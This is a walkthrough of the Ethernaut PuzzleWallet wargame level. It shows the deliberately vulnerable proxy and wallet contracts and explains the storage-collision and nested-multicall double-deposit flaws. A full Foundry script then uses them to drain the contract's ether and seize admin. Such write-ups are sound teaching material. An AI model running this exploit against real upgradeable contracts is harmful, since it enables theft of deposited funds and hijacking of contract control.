# Ethernaut Level 24 PuzzleWallet

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

Our job is to hijack the contract and make ourselves `admin`. 

We are first given a contract instance, and since there are two contracts here, one proxy contract, one implementation contract, it is a little bit tricky to distinguish of which contract is this instance. We can check the ABIs of this address:

```
abi
: 
Array(10)
0
: 
{type: 'function', name: 'addToWhitelist', inputs: Array(1), outputs: Array(0), stateMutability: 'nonpayable', …}
1
: 
{type: 'function', name: 'balances', inputs: Array(1), outputs: Array(1), stateMutability: 'view', …}
2
: 
{type: 'function', name: 'deposit', inputs: Array(0), outputs: Array(0), stateMutability: 'payable', …}
3
: 
{type: 'function', name: 'execute', inputs: Array(3), outputs: Array(0), stateMutability: 'payable', …}
4
: 
{type: 'function', name: 'init', inputs: Array(1), outputs: Array(0), stateMutability: 'nonpayable', …}
5
: 
{type: 'function', name: 'maxBalance', inputs: Array(0), outputs: Array(1), stateMutability: 'view', …}
6
: 
{type: 'function', name: 'multicall', inputs: Array(1), outputs: Array(0), stateMutability: 'payable', …}
7
: 
{type: 'function', name: 'owner', inputs: Array(0), outputs: Array(1), stateMutability: 'view', …}
8
: 
{type: 'function', name: 'setMaxBalance', inputs: Array(1), outputs: Array(0), stateMutability: 'nonpayable', …}
9
: 
{type: 'function', name: 'whitelisted', inputs: Array(1), outputs: Array(1), stateMutability: 'view', …}
length
: 
10
```

The output seems with only implementation's ABIs. It is confusing, but seeing only **wallet (implementation) methods** in your JS contract object does **not** prove the address is the implementation. It only proves the **ABI** you used to create the object contained only wallet methods. 

To tell for sure whether the address is a **proxy** or an **implementation**, we can try to read the EIP-1967 implementation storage slot. Most OZ / EIP-1967 proxies store impl addr at slot: `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`. We can check it using command:

```js
const IMPL_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
await web3.eth.getStorageAt(contract.address, IMPL_SLOT);
```

Output:

```
0x00000000000000000000000045adbc496759865a5bb18097e9adaaa097ffe866
```

Since it is not an empty input, this address is actually a **proxy** address exposed with wallet ABIs.

Now we go back to the source code. How can we hijack the `admin`? We cannot directly change `admin` by calling proxy functions, so what we can only do is to leverage the storage overlapping feature, trying to find way to delegate call some `PuzzleWallet` function that can modify `uint256 public maxBalance`, thus change the `admin` in the proxy.

When we directly code like this: `proxy.implFunction()`, if `implFunction` is not defined in the proxy contract, the openzeppelin proxy will call the fallback, and inside the fallback it **forwards** your original calldata to the implementation via **delegatecall**. So when we call `proxy.addToWhitelist(address addr)`, since all the other wallet functions are guarded by the whitelist, it is actually a **delegatecall**, so `msg.sender` will preserved as our **EOA**, and `owner` will be what is stored in the slot 0 of proxy contract. If we have called `proxy.proposeNewAdmin(address _newAdmin)` previously, we would have set the slot 0 to be our EOA, so the condition will meet, and we can successfully add our EOA to the whitelist.

Notice that after setting ourselves to the whitelist, we can call `setMaxBalance(uint256 _maxBalance)` to modify   `uint256 public maxBalance` only if the contract balance is 0. If we run this command:

```js
Number(await getBalance(contract.address))
```

We will see that the balance of proxy address is **not** 0, with a balance of 0.001 ether. We can call `execute` to extract money from the contract, however, we need to first have a `balances[msg.sender]` that is larger than the `value`, so we cannot drain the balance by calling `execute` only. We have to figure out a way to trick the `balances[msg.sender]` so that we can actually deposit only 0.001 ether, but `balances[msg.sender]` would show that we have "deposited" twice (0.002 ether), so that we can call `execute` with a `value` of 0.002 ether and drain the balance.

How can we do that? 

We have to call `multicall` function. However, the input `bytes[] calldata data` should be carefully made, since we cannot really put two `deposit()` calldata in one single array with the requirement `require(!depositCalled, "Deposit can only be called once")`. 

Instead, we can make a **nested** calldata array, this array look like this:

```
[
  encode(deposit()),
  encode(multicall([
  	encode(deposit())
  ]))
]
```

The outercalls is a `bytes[](2)`, with first element the calldata of `deposit()`, and second element the calldata of `multicall(innercalls)`. Inside the innercalls is a `bytes[](1)`, with first element the calldata of `deposit()`. Since all the variables inside the functions are stored at stacks & memories instead of the storage, each time we start a new function call, each variable states inside the function will **reset**. So for the outercalls and innercalls, `bool depositCalled = false` will reset separately, `balances[msg.sender] += msg.value` will happen **TWICE** if we call `proxy.multicall{value}(bytes[] calldata outercalls)`. However, we only send `msg.value` **ONCE** because we only do one call that is with actual `value`, that is the first call. All the nested delegate calls inside `multicall` is with no `value`, since **msg.value** **number** is preserved in each call frame, but that’s just a **readable value**, not a new transfer. **Delegate calls cannot move ETH**.

`Interfaces.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
    function admin() external view returns (address);
}

interface IPuzzleWallet {
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external;
    function multicall(bytes[] calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}
```

`PuzzleWallet.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {IPuzzleProxy, IPuzzleWallet} from "../src/Interfaces.sol";

contract PuzzleWalletScript is Script {
    address constant proxyAddress = 0xXXXXXXXXX;
    IPuzzleProxy proxy = IPuzzleProxy(proxyAddress);
    IPuzzleWallet wallet = IPuzzleWallet(proxyAddress);
    uint256 proxyEthBalance = proxyAddress.balance; // 0.001 ether

    function run() external {
        vm.startBroadcast();
        // Step 1: modify pendingAdmin to our EOA (slot 0).
        proxy.proposeNewAdmin(msg.sender);

        // Step 2: add ourselves to the whitelist.
        // It is a delegatecall, so msg.sender is preserved as our EOA, and owner is preserved as EOA (slot 0).
        wallet.addToWhitelist(msg.sender);

        // Step 3: make nested multicall
        // balances[msg.sender] will be increased by 0.001 TWICE, but only 0.001 ether is sent.
        bytes[] memory innerCalls = new bytes[](1);
        innerCalls[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory outerCalls = new bytes[](2);
        outerCalls[0] = abi.encodeWithSelector(wallet.deposit.selector);
        outerCalls[1] = abi.encodeWithSelector(wallet.multicall.selector, innerCalls);
        wallet.multicall{value: proxyEthBalance}(outerCalls);

        // Step 4: drain all ether from the contract.
        wallet.execute(msg.sender, proxyEthBalance * 2, "");

        // Step 5: set maxBalance to our EOA address (slot 1), which is also the admin slot for the proxy.
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
        console.log("Attack completed. New admin:", proxy.admin());
        vm.stopBroadcast();
    }
}
```

